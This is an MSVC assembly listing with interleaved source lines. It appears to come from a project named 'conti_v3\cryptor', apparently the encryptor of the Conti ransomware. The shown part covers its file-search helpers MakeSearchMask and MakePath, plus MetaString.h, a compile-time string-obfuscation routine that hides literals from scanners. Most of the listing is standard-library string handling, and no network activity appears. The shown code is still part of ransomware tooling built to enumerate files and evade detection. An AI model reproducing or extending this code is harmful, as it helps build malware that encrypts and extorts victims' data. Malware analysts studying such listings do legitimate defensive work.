; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  00285	48 8b 4d 27	 mov	 rcx, QWORD PTR $T7[rbp-73]
  00289	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  00291	48 8b c1	 mov	 rax, rcx

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  00294	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  0029b	72 15		 jb	 SHORT $LN155@MakeSearch

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  0029d	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  002a1	48 83 c2 27	 add	 rdx, 39			; 00000027H
  002a5	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  002a8	48 83 c0 f8	 add	 rax, -8
  002ac	48 83 f8 1f	 cmp	 rax, 31
  002b0	77 75		 ja	 SHORT $LN181@MakeSearch
$LN155@MakeSearch:

; 268  :         ::operator delete(_Ptr, _Bytes);

  002b2	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN156@MakeSearch:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  002b7	48 8b 53 18	 mov	 rdx, QWORD PTR [rbx+24]
  002bb	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  002bf	76 31		 jbe	 SHORT $LN185@MakeSearch
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  002c1	48 8b 0b	 mov	 rcx, QWORD PTR [rbx]
  002c4	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  002cc	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  002d3	72 18		 jb	 SHORT $LN184@MakeSearch

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  002d5	4c 8b 41 f8	 mov	 r8, QWORD PTR [rcx-8]
  002d9	48 83 c2 27	 add	 rdx, 39			; 00000027H

; 164  : 
; 165  :     // If the following asserts, it likely means that we are performing
; 166  :     // an aligned delete on memory coming from an unaligned allocation.
; 167  :     _STL_ASSERT(_Ptr_user[-2] == _Big_allocation_sentinel, "invalid argument");
; 168  : 
; 169  :     // Extra paranoia on aligned allocation/deallocation; ensure _Ptr_container is
; 170  :     // in range [_Min_back_shift, _Non_user_size]
; 171  : #ifdef _DEBUG
; 172  :     constexpr uintptr_t _Min_back_shift = 2 * sizeof(void*);
; 173  : #else // ^^^ defined(_DEBUG) / !defined(_DEBUG) vvv
; 174  :     constexpr uintptr_t _Min_back_shift = sizeof(void*);
; 175  : #endif // ^^^ !defined(_DEBUG) ^^^
; 176  :     const uintptr_t _Back_shift = reinterpret_cast<uintptr_t>(_Ptr) - _Ptr_container;

  002dd	49 2b c8	 sub	 rcx, r8

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  002e0	48 8d 41 f8	 lea	 rax, QWORD PTR [rcx-8]
  002e4	48 83 f8 1f	 cmp	 rax, 31
  002e8	77 3d		 ja	 SHORT $LN181@MakeSearch

; 178  :     _Ptr = reinterpret_cast<void*>(_Ptr_container);

  002ea	49 8b c8	 mov	 rcx, r8
$LN184@MakeSearch:

; 268  :         ::operator delete(_Ptr, _Bytes);

  002ed	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN185@MakeSearch:
  002f2	48 8b bc 24 c0
	00 00 00	 mov	 rdi, QWORD PTR [rsp+192]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 23   : 	return SearchMask;

  002fa	48 8b c6	 mov	 rax, rsi
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4873 :         _My_data._Mysize = 0;

  002fd	4c 89 73 10	 mov	 QWORD PTR [rbx+16], r14

; 4874 :         _My_data._Myres  = _Small_string_capacity;

  00301	48 c7 43 18 07
	00 00 00	 mov	 QWORD PTR [rbx+24], 7

; 4875 :         // the _Traits::assign is last so the codegen doesn't think the char write can alias this
; 4876 :         _Traits::assign(_My_data._Bx._Buf[0], _Elem());

  00309	66 44 89 33	 mov	 WORD PTR [rbx], r14w
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 24   : }

  0030d	48 8b 9c 24 c8
	00 00 00	 mov	 rbx, QWORD PTR [rsp+200]
  00315	48 81 c4 90 00
	00 00		 add	 rsp, 144		; 00000090H
  0031c	41 5e		 pop	 r14
  0031e	5e		 pop	 rsi
  0031f	5d		 pop	 rbp
  00320	c3		 ret	 0
$LN204@MakeSearch:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4973 :         _Xlen_string();

  00321	e8 00 00 00 00	 call	 ?_Xlen_string@std@@YAXXZ ; std::_Xlen_string
  00326	cc		 int	 3
$LN181@MakeSearch:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00327	e8 00 00 00 00	 call	 _invalid_parameter_noinfo_noreturn
  0032c	cc		 int	 3
$LN226@MakeSearch:
?MakeSearchMask@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@@Z ENDP ; MakeSearchMask
_TEXT	ENDS
; Function compile flags: /Ogtpy
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp
;	COMDAT ?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z
_TEXT	SEGMENT
$T1 = 64
$T7 = 64
$T11 = 72
$T16 = 104
$T6 = 136
__$ReturnUdt$ = 240
Directory$ = 248
Filename$ = 256
?MakePath@@YA?AV?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@V12@0@Z PROC ; MakePath, COMDAT

; 32   : {

$LN305:
  00000	40 55		 push	 rbp
  00002	56		 push	 rsi
  00003	57		 push	 rdi
  00004	41 54		 push	 r12
  00006	41 55		 push	 r13
  00008	48 8d 6c 24 c9	 lea	 rbp, QWORD PTR [rsp-55]
  0000d	48 81 ec c0 00
	00 00		 sub	 rsp, 192		; 000000c0H
  00014	45 33 ed	 xor	 r13d, r13d
  00017	4c 8b e1	 mov	 r12, rcx
  0001a	44 89 6d b7	 mov	 DWORD PTR $T1[rbp-137], r13d
  0001e	48 8b fa	 mov	 rdi, rdx
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2226 :         value_type* _Result = _Bx._Buf;

  00021	48 8b ca	 mov	 rcx, rdx
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 32   : {

  00024	49 8b f0	 mov	 rsi, r8
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00027	48 8b 52 18	 mov	 rdx, QWORD PTR [rdx+24]
  0002b	48 83 fa 07	 cmp	 rdx, 7

; 2227 :         if (_Large_mode_engaged()) {

  0002f	76 03		 jbe	 SHORT $LN271@MakePath

; 2228 :             _Result = _Unfancy(_Bx._Ptr);

  00031	48 8b 09	 mov	 rcx, QWORD PTR [rcx]
$LN271@MakePath:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 33   : 	WCHAR t = Directory[Directory.length() - 1];

  00034	48 8b 47 10	 mov	 rax, QWORD PTR [rdi+16]
  00038	48 89 9c 24 08
	01 00 00	 mov	 QWORD PTR [rsp+264], rbx

; 34   : 	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;

  00040	66 83 7c 41 fe
	5c		 cmp	 WORD PTR [rcx+rax*2-2], 92 ; 0000005cH
  00046	75 59		 jne	 SHORT $LN3@MakePath
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4934 :     const auto _Right_size = _Right.size();

  00048	4d 8b 40 10	 mov	 r8, QWORD PTR [r8+16]

; 4935 :     if (_Left.max_size() - _Left_size < _Right_size) {

  0004c	48 b9 fe ff ff
	ff ff ff ff 7f	 mov	 rcx, 9223372036854775806 ; 7ffffffffffffffeH
  00056	48 2b c8	 sub	 rcx, rax
  00059	49 3b c8	 cmp	 rcx, r8
  0005c	0f 82 8e 03 00
	00		 jb	 $LN274@MakePath

; 2235 :         const value_type* _Result = _Bx._Buf;

  00062	4c 8b cf	 mov	 r9, rdi

; 2244 :         return _Myres > _Small_string_capacity;

  00065	48 83 fa 07	 cmp	 rdx, 7

; 2236 :         if (_Large_mode_engaged()) {

  00069	76 03		 jbe	 SHORT $LN272@MakePath

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  0006b	4c 8b 0f	 mov	 r9, QWORD PTR [rdi]
$LN272@MakePath:

; 2244 :         return _Myres > _Small_string_capacity;

  0006e	48 83 7e 18 07	 cmp	 QWORD PTR [rsi+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  00073	48 8b ce	 mov	 rcx, rsi

; 2236 :         if (_Large_mode_engaged()) {

  00076	76 03		 jbe	 SHORT $LN273@MakePath

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00078	48 8b 0e	 mov	 rcx, QWORD PTR [rsi]
$LN273@MakePath:

; 4939 :     return {_String_constructor_concat_tag{}, _Left, _Left.c_str(), _Left_size, _Right.c_str(), _Right_size};

  0007b	4c 89 44 24 30	 mov	 QWORD PTR [rsp+48], r8
  00080	48 89 4c 24 28	 mov	 QWORD PTR [rsp+40], rcx
  00085	48 8d 4d ff	 lea	 rcx, QWORD PTR $T6[rbp-137]
  00089	48 89 44 24 20	 mov	 QWORD PTR [rsp+32], rax
  0008e	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >
  00093	48 8d 45 ff	 lea	 rax, QWORD PTR $T6[rbp-137]
  00097	bb 01 00 00 00	 mov	 ebx, 1

; 4940 : }

  0009c	e9 89 01 00 00	 jmp	 $LN4@MakePath
$LN3@MakePath:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\obfuscation\MetaString.h

; 83   :     volatile bool m_isDecrypted = false;

  000a1	44 88 6d b7	 mov	 BYTE PTR $T7[rbp-137], r13b
  000a5	c6 45 b8 19	 mov	 BYTE PTR $T7[rbp-136], 25
  000a9	c6 45 b9 13	 mov	 BYTE PTR $T7[rbp-135], 19
  000ad	c6 45 ba 13	 mov	 BYTE PTR $T7[rbp-134], 19
  000b1	c6 45 bb 13	 mov	 BYTE PTR $T7[rbp-133], 19
  000b5	0f b6 45 b8	 movzx	 eax, BYTE PTR $T7[rbp-136]

; 58   :         return m_isDecrypted;

  000b9	0f b6 45 b7	 movzx	 eax, BYTE PTR $T7[rbp-137]

; 63   :         if (!isDecrypted())

  000bd	84 c0		 test	 al, al
  000bf	75 60		 jne	 SHORT $LN45@MakePath

; 64   :         {
; 65   :             for (size_t i = 0; i < sizeof...(Ints); ++i)

  000c1	4d 8b c5	 mov	 r8, r13
  000c4	0f 1f 40 00 0f
	1f 84 00 00 00
	00 00		 npad	 12
$LL46@MakePath:

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  000d0	42 0f b6 4c 05
	b8		 movzx	 ecx, BYTE PTR $T7[rbp+r8-136]

; 80   :         return positive_modulo(ExtendedEuclidian<127, A>::y * (byte - B), 127);

  000d6	b8 13 00 00 00	 mov	 eax, 19
  000db	2b c1		 sub	 eax, ecx
  000dd	6b c8 1b	 imul	 ecx, eax, 27

; 40   :     return (a % n + n) % n;

  000e0	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  000e5	f7 e9		 imul	 ecx
  000e7	03 d1		 add	 edx, ecx
  000e9	c1 fa 06	 sar	 edx, 6
  000ec	8b c2		 mov	 eax, edx
  000ee	c1 e8 1f	 shr	 eax, 31
  000f1	03 d0		 add	 edx, eax
  000f3	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  000f6	2b c8		 sub	 ecx, eax
  000f8	b8 09 04 02 81	 mov	 eax, -2130574327	; ffffffff81020409H
  000fd	83 c1 7f	 add	 ecx, 127		; 0000007fH
  00100	f7 e9		 imul	 ecx
  00102	03 d1		 add	 edx, ecx
  00104	c1 fa 06	 sar	 edx, 6
  00107	8b c2		 mov	 eax, edx
  00109	c1 e8 1f	 shr	 eax, 31
  0010c	03 d0		 add	 edx, eax
  0010e	6b c2 7f	 imul	 eax, edx, 127		; 0000007fH
  00111	2b c8		 sub	 ecx, eax

; 66   :                 m_buffer[i] = decrypt(m_buffer[i]);

  00113	42 88 4c 05 b8	 mov	 BYTE PTR $T7[rbp+r8-136], cl
  00118	49 ff c0	 inc	 r8
  0011b	49 83 f8 04	 cmp	 r8, 4
  0011f	72 af		 jb	 SHORT $LL46@MakePath
$LN45@MakePath:
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 4970 :     const auto _Left_size  = _Left.size();

  00121	48 8b 57 10	 mov	 rdx, QWORD PTR [rdi+16]

; 264  :         return _CSTD wcslen(reinterpret_cast<const wchar_t*>(_First));

  00125	48 8d 4d b8	 lea	 rcx, QWORD PTR $T7[rbp-136]
  00129	48 c7 c0 ff ff
	ff ff		 mov	 rax, -1
$LL276@MakePath:
  00130	48 ff c0	 inc	 rax
  00133	66 44 39 2c 41	 cmp	 WORD PTR [rcx+rax*2], r13w
  00138	75 f6		 jne	 SHORT $LL276@MakePath

; 4972 :     if (_Left.max_size() - _Left_size < _Right_size) {

  0013a	48 b9 fe ff ff
	ff ff ff ff 7f	 mov	 rcx, 9223372036854775806 ; 7ffffffffffffffeH
  00144	48 2b ca	 sub	 rcx, rdx
  00147	48 3b c8	 cmp	 rcx, rax
  0014a	0f 82 a0 02 00
	00		 jb	 $LN274@MakePath

; 2244 :         return _Myres > _Small_string_capacity;

  00150	48 83 7f 18 07	 cmp	 QWORD PTR [rdi+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  00155	4c 8b cf	 mov	 r9, rdi
  00158	4c 89 b4 24 b8
	00 00 00	 mov	 QWORD PTR [rsp+184], r14
  00160	4c 89 bc 24 b0
	00 00 00	 mov	 QWORD PTR [rsp+176], r15

; 2236 :         if (_Large_mode_engaged()) {

  00168	76 03		 jbe	 SHORT $LN63@MakePath

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  0016a	4c 8b 0f	 mov	 r9, QWORD PTR [rdi]
$LN63@MakePath:

; 4976 :     return {_String_constructor_concat_tag{}, _Left, _Left.c_str(), _Left_size, _Right, _Right_size};

  0016d	48 89 44 24 30	 mov	 QWORD PTR [rsp+48], rax
  00172	48 8d 4d bf	 lea	 rcx, QWORD PTR $T11[rbp-137]
  00176	48 8d 45 b8	 lea	 rax, QWORD PTR $T7[rbp-136]
  0017a	48 89 44 24 28	 mov	 QWORD PTR [rsp+40], rax
  0017f	48 89 54 24 20	 mov	 QWORD PTR [rsp+32], rdx
  00184	e8 00 00 00 00	 call	 ??0?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAA@U_String_constructor_concat_tag@1@AEBV01@QEB_W_K23@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >

; 2244 :         return _Myres > _Small_string_capacity;

  00189	48 83 7e 18 07	 cmp	 QWORD PTR [rsi+24], 7

; 2235 :         const value_type* _Result = _Bx._Buf;

  0018e	4c 8b ce	 mov	 r9, rsi

; 2236 :         if (_Large_mode_engaged()) {

  00191	76 03		 jbe	 SHORT $LN269@MakePath

; 2237 :             _Result = _Unfancy(_Bx._Ptr);

  00193	4c 8b 0e	 mov	 r9, QWORD PTR [rsi]
$LN269@MakePath:

; 3306 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  00196	48 8b 4d d7	 mov	 rcx, QWORD PTR $T11[rbp-113]
  0019a	4c 8b 7d cf	 mov	 r15, QWORD PTR $T11[rbp-121]
  0019e	48 8b c1	 mov	 rax, rcx

; 3277 :         return append(_Right._Mypair._Myval2._Myptr(), _Right._Mypair._Myval2._Mysize);

  001a1	4c 8b 76 10	 mov	 r14, QWORD PTR [rsi+16]

; 3306 :         const size_type _Old_size = _Mypair._Myval2._Mysize;

  001a5	49 2b c7	 sub	 rax, r15

; 3307 :         if (_Count <= _Mypair._Myval2._Myres - _Old_size) {

  001a8	4c 3b f0	 cmp	 r14, rax
  001ab	77 34		 ja	 SHORT $LN77@MakePath

; 2244 :         return _Myres > _Small_string_capacity;

  001ad	48 83 f9 07	 cmp	 rcx, 7

; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  001b1	4b 8d 04 37	 lea	 rax, QWORD PTR [r15+r14]

; 2226 :         value_type* _Result = _Bx._Buf;

  001b5	48 8d 5d bf	 lea	 rbx, QWORD PTR $T11[rbp-137]

; 3309 :             _Mypair._Myval2._Mysize = _Old_size + _Count;

  001b9	48 89 45 cf	 mov	 QWORD PTR $T11[rbp-121], rax

; 2227 :         if (_Large_mode_engaged()) {

  001bd	48 0f 47 5d bf	 cmova	 rbx, QWORD PTR $T11[rbp-137]

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  001c2	4f 8d 04 36	 lea	 r8, QWORD PTR [r14+r14]
  001c6	49 8b d1	 mov	 rdx, r9

; 3311 :             _Traits::move(_Old_ptr + _Old_size, _Ptr, _Count);

  001c9	4a 8d 0c 7b	 lea	 rcx, QWORD PTR [rbx+r15*2]

; 117  :         _CSTD memmove(_First1, _First2, _Count * sizeof(_Elem));

  001cd	e8 00 00 00 00	 call	 memmove

; 3312 :             _Traits::assign(_Old_ptr[_Old_size + _Count], _Elem());

  001d2	4b 8d 04 37	 lea	 rax, QWORD PTR [r15+r14]
  001d6	66 44 89 2c 43	 mov	 WORD PTR [rbx+rax*2], r13w

; 3313 :             return *this;

  001db	48 8d 45 bf	 lea	 rax, QWORD PTR $T11[rbp-137]
  001df	eb 11		 jmp	 SHORT $LN76@MakePath
$LN77@MakePath:

; 3314 :         }
; 3315 : 
; 3316 :         return _Reallocate_grow_by(

  001e1	49 8b d6	 mov	 rdx, r14
  001e4	4c 89 74 24 20	 mov	 QWORD PTR [rsp+32], r14
  001e9	48 8d 4d bf	 lea	 rcx, QWORD PTR $T11[rbp-137]
  001ed	e8 00 00 00 00	 call	 ??$_Reallocate_grow_by@V<lambda_1>@?1??append@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@QEAAAEAV34@QEB_W_K@Z@PEB_W_K@?$basic_string@_WU?$char_traits@_W@std@@V?$allocator@_W@2@@std@@AEAAAEAV01@_KV<lambda_1>@?1??append@01@QEAAAEAV01@QEB_W0@Z@PEB_W_K@Z ; std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::_Reallocate_grow_by<`std::basic_string<wchar_t,std::char_traits<wchar_t>,std::allocator<wchar_t> >::append'::`2'::<lambda_1>,wchar_t const *,unsigned __int64>
$LN76@MakePath:

; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  001f2	0f 10 00	 movups	 xmm0, XMMWORD PTR [rax]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 34   : 	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;

  001f5	4c 8b bc 24 b0
	00 00 00	 mov	 r15, QWORD PTR [rsp+176]
  001fd	bb 06 00 00 00	 mov	 ebx, 6
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  00202	0f 10 48 10	 movups	 xmm1, XMMWORD PTR [rax+16]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 34   : 	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;

  00206	4c 8b b4 24 b8
	00 00 00	 mov	 r14, QWORD PTR [rsp+184]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 3082 :                 _Right_data._Mysize = 0;

  0020e	4c 89 68 10	 mov	 QWORD PTR [rax+16], r13

; 3083 :                 _Right_data._Myres  = _Small_string_capacity;

  00212	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 3084 :                 _Right_data._Activate_SSO_buffer();
; 3085 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  0021a	66 44 89 28	 mov	 WORD PTR [rax], r13w
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 34   : 	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;

  0021e	48 8d 45 df	 lea	 rax, QWORD PTR $T16[rbp-137]
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 3080 :                 _CSTD memcpy(_My_data_mem, _Right_data_mem, _Memcpy_val_size);

  00222	0f 11 45 df	 movups	 XMMWORD PTR $T16[rbp-137], xmm0
  00226	0f 11 4d ef	 movups	 XMMWORD PTR $T16[rbp-121], xmm1
$LN4@MakePath:
  0022a	0f 10 00	 movups	 xmm0, XMMWORD PTR [rax]
  0022d	0f 10 48 10	 movups	 xmm1, XMMWORD PTR [rax+16]

; 3082 :                 _Right_data._Mysize = 0;

  00231	4c 89 68 10	 mov	 QWORD PTR [rax+16], r13

; 3083 :                 _Right_data._Myres  = _Small_string_capacity;

  00235	48 c7 40 18 07
	00 00 00	 mov	 QWORD PTR [rax+24], 7

; 3084 :                 _Right_data._Activate_SSO_buffer();
; 3085 :                 _Traits::assign(_Right_data._Bx._Buf[0], _Elem());

  0023d	66 44 89 28	 mov	 WORD PTR [rax], r13w
  00241	41 0f 11 04 24	 movups	 XMMWORD PTR [r12], xmm0
  00246	41 0f 11 4c 24
	10		 movups	 XMMWORD PTR [r12+16], xmm1
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 34   : 	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;

  0024c	f6 c3 04	 test	 bl, 4
  0024f	74 43		 je	 SHORT $LN142@MakePath
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00251	48 8b 55 f7	 mov	 rdx, QWORD PTR $T16[rbp-113]
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 34   : 	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;

  00255	83 e3 fb	 and	 ebx, -5
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00258	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  0025c	76 36		 jbe	 SHORT $LN142@MakePath
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xmemory

; 977  :         _Deallocate<_New_alignof<_Ty>>(_Ptr, sizeof(_Ty) * _Count);

  0025e	48 8b 4d df	 mov	 rcx, QWORD PTR $T16[rbp-137]
  00262	48 8d 14 55 02
	00 00 00	 lea	 rdx, QWORD PTR [rdx*2+2]
  0026a	48 8b c1	 mov	 rax, rcx

; 264  :         if (_Bytes >= _Big_allocation_threshold) { // boost the alignment of big allocations to help autovectorization

  0026d	48 81 fa 00 10
	00 00		 cmp	 rdx, 4096		; 00001000H
  00274	72 19		 jb	 SHORT $LN141@MakePath

; 163  :     const uintptr_t _Ptr_container   = _Ptr_user[-1];

  00276	48 8b 49 f8	 mov	 rcx, QWORD PTR [rcx-8]
  0027a	48 83 c2 27	 add	 rdx, 39			; 00000027H
  0027e	48 2b c1	 sub	 rax, rcx

; 177  :     _STL_VERIFY(_Back_shift >= _Min_back_shift && _Back_shift <= _Non_user_size, "invalid argument");

  00281	48 83 c0 f8	 add	 rax, -8
  00285	48 83 f8 1f	 cmp	 rax, 31
  00289	0f 87 55 01 00
	00		 ja	 $LN196@MakePath
$LN141@MakePath:

; 268  :         ::operator delete(_Ptr, _Bytes);

  0028f	e8 00 00 00 00	 call	 ??3@YAXPEAX_K@Z		; operator delete
$LN142@MakePath:
; File C:\Users\admin-z10\Desktop\conti_v3\cryptor\filesystem\search.cpp

; 34   : 	std::wstring Path = t == L'\\' ? Directory + Filename : Directory + OBFW(L"\\") + Filename;

  00294	f6 c3 02	 test	 bl, 2
  00297	74 52		 je	 SHORT $LN174@MakePath
; File C:\Program Files\Microsoft Visual Studio\2022\Community\VC\Tools\MSVC\14.39.33519\include\xstring

; 2244 :         return _Myres > _Small_string_capacity;

  00299	48 8b 55 d7	 mov	 rdx, QWORD PTR $T11[rbp-113]
  0029d	48 83 fa 07	 cmp	 rdx, 7

; 4866 :         if (_My_data._Large_mode_engaged()) {

  002a1	76 36		 jbe	 SHORT $LN171@MakePath
